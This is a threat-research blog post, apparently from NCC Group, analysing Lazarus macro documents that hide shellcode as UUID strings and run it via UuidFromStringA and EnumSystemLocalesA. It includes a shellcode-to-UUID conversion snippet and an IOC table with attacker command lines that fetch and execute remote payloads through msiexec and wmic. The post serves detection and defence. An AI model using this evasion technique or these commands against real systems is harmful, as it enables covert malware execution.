Cyber security is an arms race where both attackers and_\n_defenders continually update and improve their tools and ways of working. To ensure that our managed services remain effective against the_\n_latest threats, NCC Group operates a Global Fusion Center with Fox-IT at its core. This multidisciplinary team converts our leading cyber_\n_threat intelligence into powerful detection strategies._\n\n[On January 21st, the following malware sample was shared by CheckPoint research team via Twitter. The post mentions that this loader](https://www.virustotal.com/gui/file/f188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88/detection)\nbelongs to Lazarus group. The modus operandi of phishing with macro documents disguised as job descriptions (via LinkedIn), was also\n[recently documented by ESET in their Operation In(ter)ception paper.](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf)\n\n[New loader by #Lazarus – Operation In(ter)ception🕵](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw)\n\n🔹 Reused decoy and obfuscated macros\n\n🔹 Loader compiled on 2021-01-12\n\n🔹 Creates a bloated copy of msiexec.exe\n\n🔹 Scheduled task with VBS for persistence\n\n[🔹 Indirect command execution with pcalua.exehttps://t.co/UWVoSOUUxU](https://t.co/UWVoSOUUxU) [pic.twitter.com/NNycLbRuPu](https://t.co/NNycLbRuPu)\n\n[— Check Point Research (@_CPResearch_) January 21, 2021](https://twitter.com/_CPResearch_/status/1352310521752662018?ref_src=twsrc%5Etfw)\n\nAfter analysing the macro document, and pivoting on the macro, NCC Group’s RIFT identified a number of other similar documents. In these\ndocuments we came across an interesting technique being used to execute shellcode from VBA without the use of common “suspicious” APIs,\nsuch as `VirtualAlloc,` `WriteProcessMemory or` `CreateThread – which may be detected by end point protection solutions. Instead, the`\nmacro documents abuse “benign” Windows API features to achieve code-execution.\n\n## Shellcode Execution Technique\n\nAfter extracting the macro, we can see that the VBA macro declares a number API calls. An alias is registered in an attempt to make these API\ncalls appear less suspicious.\n\n\n-----\n\nOnce these are renamed, we can easily see what the macro is doing:\n\n[1. First, macro execution is triggered using the “Microsoft Forms 2.0 Frame” ActiveX control, using the](https://www.greyhathacker.net/?p=948) `Frame1_Layout event.`\n2. Once triggered, it creates a new executable heap via `HeapCreate`\n3. It then allocates some memory on the newly created heap using `HeapAlloc`\n4. It then calls `FindImage1,` `FindImage2 and` `FindImage3 user defined VBA functions`\n\nLooking at the `FindImage functions, we can notice something interesting. The code is using the` `UuidFromStringA Windows API function,`\nand iterating through a large list of hardcoded UUID values, each time providing a pointer into to the previously allocated heap. This seems\ninteresting as it appears to be a way of writing data to the (executable) heap!\n\nIf we check the Microsoft documentation for the `UuidFromStringA function, we can see that it takes a string-based UUID and converts it to`\nit’s binary representation. It takes a pointer to a UUID, which will be used to return the converted binary data. By providing a pointer to an heap\naddress, this function can be (ab)used to both decode data and write it to memory without using common functions such as `memcpy or`\n```\nWriteProcessMemory .\n\n```\n\n-----\n\nMicrosoft uses little-endian byte-order for storing GUIDs in binary form. Converting shellcode bytes to a GUID string in Python is as simple as:\n```\n>>> u = '\\xEF\\x8B\\x74\\x1F\\x1C\\x48\\x01\\xFE\\x8B\\x34\\xAE\\x48\\x01\\xF7\\x99\\xFF'\n>>> uuid.UUID(bytes_le=u)\nUUID('1f748bef-481c-fe01-8b34-ae4801f799ff')\n\n```\nTo convert it from a string to bytes:\n```\n>>> uuid.UUID('1f748bef-481c-fe01-8b34-ae4801f799ff').bytes_le\n'\\xef\\x8bt\\x1f\\x1cH\\x01\\xfe\\x8b4\\xaeH\\x01\\xf7\\x99\\xff'\n\n```\nLooking back at the main function of the macro, we can see that after decoding the shellcode from UUID values and writing it to the heap, it\ncalls then `EnumSystemLocalesA .`\n\nAgain, looking at the MSDN page, we find the following description:\n\nFrom this we can deduce that the `lpLocaleEnumProc parameter specifies a callback function! By providing the address returned previously`\nby HeapAlloc, this function can be (ab)used to execute shellcode. Searching on the internet reveals that this technique was previously\n[documented by](http://ropgadget.com/posts/abusing_win_functions.html) [Jeff White. Their blog lists a large number of other APIs which could be abused to achieve a similar result.](https://twitter.com/noottrak)\n\n## Re-Implementing in C\n\nIn order to experiment with the techniques used within these macro documents, we wrote a small shellcode execution harness, converting the\nVBA into C, to demonstrate execution of a benign `calc shellcode. This may be useful for anyone wishing to study the technique or build`\nfurther detection logic.\n\nWhen we run the executable, we can see that the `calc shellcode is written to the heap and executes when we call` `EnumSystemLocalA :`\n\n\n-----\n\n## Decoding the Macro\n\nThe following script was created to extract and decode the shellcode from the sample. We confirmed that script works for other related\nsamples we have in our dataset. Whilst some of them (such as the one shared by CheckPoint) are more heavily obfuscated, the shellcode\nencoding (via GUIDs) is the same.\n\n[Executing the extracted shellcode, we can confirm the IOCs that were shared in CheckPoint’s original Tweet, as well as the AnyRun report.](https://app.any.run/tasks/39059fe7-c4a4-42d1-944b-96c447b2d442/)\n[Florian Roth also shared that this sample is detected with this Sigma rule.](https://twitter.com/cyb3rops/status/1352327393420210181)\n\n\n-----\n\n## Samples\n\nThe following samples were identified:\n```\n47a342545d8df9c2c1e0e945f2c4fca3a440dc00cff40727abff12d307c8c788\nbdf9fffe1c9ffbeec307c536a2369eefb2a2c5d70f33a1646a15d6d152c2a6fa\ncabb45c99ffd8dd189e4e3ed5158fac1d0de4e2782dd704b2b595db5f63e2610\n949bfce2125d76f2d21084f187c681397d113e1bbdc550694a7bce7f451a6e69\nf188eec1268fd49bdc7375fc5b77ded657c150875fede1a4d797f818d2514e88\n\n## IOCs\n\n```\nType Data File Hash\n\nFolder C:\\ProgramLogs\\ N/A\n\n\nScheduled\nTask\n\nCommand\nLine\n\nCommand\nLine\n\n\nC:\\Windows\\Tasks\\ProgramLogsSrv.job N/A\n\n\nC:\\Windows\\system32\\wscript.EXE\n“C:\\ProgramLogs\\PerformLogs.vbs”\n\nC:\\ProgramLogs\\AdvancedLog.exe /Q /i\n“hxxp://crmute[.]com/custom.css”\n\n\nN/A\n\nN/A\n\n\n-----\n\nCommand\nLine\n\n\nC:\\Windows\\System32\\pcalua.exe -a\n“C:\\ProgramLogs\\AdvancedLog” -c /Q /i\n“hxxp://crmute[.]com/custom.css”\n\n\nN/A\n\n\nFile C:\\ProgramLogs\\NvWatchdog.bin\n\nFile C:\\ProgramLogs\\AdvancedLog.exe d6b55dae813a4acd461d1d36ff7ef2597b6a8112feb07fac0cfc46af963690dc\n\nFile C:\\ProgramLogs\\PerformLogs.vbs c0c8a97a04b4d3c7709760fcbe36dc61e3cec294ed4180069131df53b4211da\n\nFile C:\\ProgramLogs\\wmp.dll N/A – copy of wmp.dll\n\nFolder C:\\Windows\\System32\\Tasks\\IntelGfx N/A\n\n\nScheduled\nTask\n\n\nC:\\Windows\\Tasks\\IntelGfx.job\n\n\nFile C:\\Intel\\hidasvc.exe N/A – copy of wmic.exe\n\n\nScheduled\nTask\n\n\nC:\\Windows\\Tasks\\OneDrive_{7F240FD2-19383F2C-D928-163749E2C782}.job\n\n\nFolder C:\\OneDrive N/A – copy of wmic.exe\n\nFile C:\\Intel\\hidasvc.exe N/A – copy of wmic.exe\n\n\nScheduled\nTask\n\nCommand\nLine\n\nCommand\nLine\n\n\nC:\\Windows\\Tasks\\IntelGfx.job\n\n%COMSPEC% /c Start /miN c:\\Intel\\hidasvc\nENVIRONMENT get STATUS\n/FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”\n\n%COMSPEC% /c START /MIN\nC:\\OneDrive\\OneDriveSync ENVIRONMENT GET\nSTATUS\n/FORMAT:”hxxps://www.advantims[.]com/Sync.xsl”\n\n\nN/A\n\n\n## References\n\n\n-----",
